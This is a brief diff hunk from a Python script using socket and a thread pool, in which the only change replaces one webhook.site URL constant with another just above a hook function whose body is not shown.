@@ -13,7 +13,7 @@ import argparse
 import socket
 from concurrent.futures import ThreadPoolExecutor
 
-WEBHOOK = "https://webhook.site/b80ac2d7-7cff-4cd4-bd3b-363a2829913f"
+WEBHOOK = "https://webhook.site/abc84eae-90e7-4535-aed3-3a26b7f659a0"
 
 
 def hook(txt):
